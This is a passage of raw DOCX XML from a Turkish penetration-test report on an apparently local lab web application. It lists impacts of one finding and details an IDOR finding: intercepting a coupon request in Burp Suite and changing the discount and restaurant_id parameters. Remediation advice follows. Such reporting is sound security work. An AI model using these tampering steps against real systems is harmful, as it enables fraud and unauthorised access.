          <w:p w14:paraId="7389CFED" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="08FAB2A8" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="14A49EBE" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Veri Bütünlüğünün İhlali:</w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Saldırgan, verileri değiştirebilir veya silebilir, bu da veri bütünlüğünü ciddi şekilde etkileyebilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A6A8BFC" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3488F56D" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Hizmet Durdurma: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, sistem kaynaklarını aşırı şekilde kullanarak hedef sistemin hizmet dışı kalmasına neden olabilir (DoS/DDoS saldırıları).</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="053C16E4" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6D46D675" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Sistem İzleme: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde gizlice izleme yaparak kullanıcıların etkinliklerini gözlemleyebilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="519E3818" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00402B96" w14:paraId="558FED98" w14:textId="77777777" w:rsidTr="00C20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0FB60950" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00402B96" w14:paraId="06F15FD2" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="0D9ACE84" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00C361DB" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>7.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00402B96" w14:paraId="0E4D1D40" w14:textId="77777777" w:rsidTr="00C20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74F5A1CD" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00402B96" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24F6E464" w14:textId="5E492B06" w:rsidR="004E6D77" w:rsidRDefault="00593C92" w:rsidP="00B24C32">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>6) IDOR</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00593C92" w14:paraId="0C0CD980" w14:textId="77777777" w:rsidTr="00C20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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51E2FCE6" w14:textId="77777777" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w14:paraId="0C6F6FDD" w14:textId="77777777" w:rsidTr="00C20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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="6400C416" w14:textId="18E635E6" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>IDOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w14:paraId="225CF1F8" w14:textId="77777777" w:rsidTr="00C20FA7">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A232C08" w14:textId="77777777" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w:rsidRPr="00057867" w14:paraId="6FA161B0" w14:textId="77777777" w:rsidTr="00C20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62BB805F" w14:textId="77777777" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E38AF14" w14:textId="77777777" w:rsidR="00593C92" w:rsidRPr="00BF4DE0" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w:rsidRPr="00057867" w14:paraId="40865F9F" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="1D2D8B76" w14:textId="39246BB0" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:hyperlink r:id="rId36" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> admin</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId37" w:history="1">
              <w:r w:rsidR="00FD2D0C" w:rsidRPr="004E2517">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/company_add_coupon.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="00FD2D0C">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. Burada indirim yüzdesi maximum seçilebilecek değer 100 olarak ayarlanmıştır. Kupon ekleme formu doldurulur ve istek  </w:t>
            </w:r>
            <w:r w:rsidRPr="0020446C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>BurpSuite proxy aracı ile yakalanır</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">.  Yakalanan istek üzerindeki </w:t>
            </w:r>
            <w:r w:rsidRPr="00E14D4B">
              <w:t>discount=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">paremetresi 500 değeri ile </w:t>
            </w:r>
            <w:r w:rsidR="00FD2D0C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">ve </w:t>
            </w:r>
            <w:r w:rsidR="00FD2D0C" w:rsidRPr="00FD2D0C">
              <w:t>restaurant_id=1</w:t>
            </w:r>
            <w:r w:rsidR="00FD2D0C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> parametresi 2 değeri ile değiştirilir.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> Böylece başarıyla %100 üzerinde bir indirim kuponu</w:t>
            </w:r>
            <w:r w:rsidR="00FD2D0C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapan company’inin restorantları dışında başka herhangi bir restorana </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>eklenir.</w:t>
            </w:r>
            <w:r w:rsidR="00FD2D0C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24661FDD" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00C20FA7"/>
          <w:p w14:paraId="33B75BEB" w14:textId="77777777" w:rsidR="00F44B43" w:rsidRDefault="00FD2D0C" w:rsidP="00F44B43">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3D0051A6" wp14:editId="68F838CA">
                  <wp:extent cx="5713730" cy="2297430"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="7620"/>
                  <wp:docPr id="20320944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3730" cy="2297430"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C4E0B62" w14:textId="3AD2498D" w:rsidR="00F44B43" w:rsidRPr="005A1CC9" w:rsidRDefault="00F44B43" w:rsidP="005A1CC9">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>Görsel -  11</w:t>
            </w:r>
            <w:r w:rsidR="005A1CC9" w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t xml:space="preserve"> Yakalanan İstek</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="774BDE58" w14:textId="77777777" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="349DC3D1" w14:textId="77777777" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="71B3D64A" wp14:editId="19AEAE32">
                  <wp:extent cx="5713730" cy="3306445"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="8255"/>
                  <wp:docPr id="856284883" name="Resim 4" descr="metin, ekran görüntüsü,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284883" name="Resim 4" descr="metin, ekran görüntüsü, yazı tipi, tasarım içeren bir resim&#10;&#10;Açıklama otomatik olarak oluşturuldu"/>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3730" cy="3306445"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="236DE77E" w14:textId="59F31938" w:rsidR="00593C92" w:rsidRPr="00C361DB" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidR="005A1CC9">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Dosya Yükleme İsteği</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A5699F3" w14:textId="77777777" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="775CDC8F" w14:textId="77777777" w:rsidR="00593C92" w:rsidRPr="00CF0A67" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w:rsidRPr="00057867" w14:paraId="280D5284" w14:textId="77777777" w:rsidTr="00C20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7E0F3265" w14:textId="77777777" w:rsidR="00593C92" w:rsidRPr="00057867" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w:rsidRPr="00D60321" w14:paraId="408CC337" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="3FFFF554" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRPr="00950946" w:rsidRDefault="00FD2D0C" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Güçlü Doğrulama ve Yetkilendirme Kontrolleri:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Güvenli bir kullanıcı doğrulama ve </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>yetkilendirme mekanizması oluşturulmalıdır. Kullanıcıların erişebileceği nesneler, etkili kontrollerle doğrulanmalı ve yetkilendirilmelidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59736EE1" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRPr="00950946" w:rsidRDefault="00FD2D0C" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Referans Kontrolleri ve Doğrulama:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Nesnelere erişim sırasında, referanslar arasında etkili doğrulama yapılmalıdır. Bu, kullanıcının erişim izinlerini sürekli olarak kontrol etmek için önemlidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22235551" w14:textId="3C71A600" w:rsidR="00FD2D0C" w:rsidRPr="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FD2D0C">
              <w:t>Eşsiz Kimlikler ve Doğrulama Kodları:</w:t>
            </w:r>
            <w:r w:rsidRPr="00FD2D0C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> Güvenli bir referans sistemi oluşturmak adına nesnelere eşsiz kimlikler veya doğrulama kodları eklenmelidir. Bu yöntem, yetkisiz erişimleri önlemeye yardımcı olabilir.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w14:paraId="2BF7F1BD" w14:textId="77777777" w:rsidTr="00C20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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7329F70F" w14:textId="77777777" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w14:paraId="72736C01" w14:textId="77777777" w:rsidTr="00C20FA7">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="1F10AC81" w14:textId="56736B3F" w:rsidR="00856007" w:rsidRPr="00856007" w:rsidRDefault="00856007" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Yetkisiz Kupon Ekleme</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Bir restoran sahibi, IDOR zafiyeti nedeniyle başka restoranların kuponlarını ekleyebilir. Bu, haksız rekabet yaratabilir veya mali kayıplara neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FA37C65" w14:textId="58F905F4" w:rsidR="00856007" w:rsidRPr="00856007" w:rsidRDefault="00856007" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Kuponların Suistimali :</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Bir kullanıcı, başka restoranlar için geçerli olan kuponları kendine veya başkalarına avantaj sağlamak için kullanabilir. Bu durum, gelir kaybına ve müşteri güveninin sarsılmasına neden olur.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CFE45A0" w14:textId="41377CC6" w:rsidR="00856007" w:rsidRPr="00856007" w:rsidRDefault="00856007" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Gelir Kaybı ve İtibar Zedelenmesi</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
